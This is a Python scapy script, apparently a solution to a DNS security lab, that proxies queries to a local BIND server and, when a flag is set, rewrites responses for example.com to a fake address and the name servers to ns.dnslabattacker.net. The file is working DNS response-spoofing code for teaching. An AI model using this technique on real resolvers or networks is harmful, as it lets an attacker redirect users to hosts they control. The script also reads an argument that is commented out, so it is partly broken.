#!/usr/bin/env python
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
#parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Port from where BIND sends queries
query_port = args.query_port
# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response
#Default BIND server
bindIP = "127.0.0.1"
#Spoofed IPv4
spoofIP = "1.2.3.4"
#Spoofed NS
spoofNS = "ns.dnslabattacker.net."

#Spoof a DNS packet to alter the IP addr and NS names.
def spoofPacket(packet):
	#Spoof the packet by overriding the rdata for the IP address we want to spoof
	#and we do the same for the name server by overriding rdata and rrname
	#Note: there could be multiple NS, so we need to do this for all of them
	packet.an[DNSRR].rdata = spoofIP
	#print ("Spoofed Ipv4: ", packet.an)

	numNameServers = packet[DNS].nscount
	for i in range (numNameServers):
		packet.ns[DNSRR][i].rdata = spoofNS
		packet.ns[DNSRR][i].rrname = spoofNS
	return packet

if __name__ == '__main__':
	#setup a UDP server to get a DNS request over UDP
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	sock.bind(('', port))
	while True:
		#receive a DNS query request from dig
		#print("Waiting for a request")
		clientRequest, addr = sock.recvfrom(4096)
		#print(addr)
		#print("Received dig request")
		dnsPacket = DNS(clientRequest)
		#print ("Sending to BIND")
		sock.sendto(str(dnsPacket), (addr[0], dns_port))
		#Wait for upstream BIND server's response
		#print ("Waiting for BIND reply")
		response = sock.recv(4096)
		response = DNS(response)
		#spoof the DNS packet if we need to
		name = response[DNSQR].qname
		#print("Query name is :", name)
		#print(SPOOF)
		if (SPOOF and name == 'example.com.'):
			response = spoofPacket(response)
		'''
		print "\n***** Packet Received from Remote Server *****"
		print response.show()
		print "***** End of Remote Server Packet *****\n"
		#forward response back to dig
		print("Forwarding back to dig")
		'''
		sock.sendto(str(response), (addr[0], addr[1]))
		print("Proxy lookup complete\n")
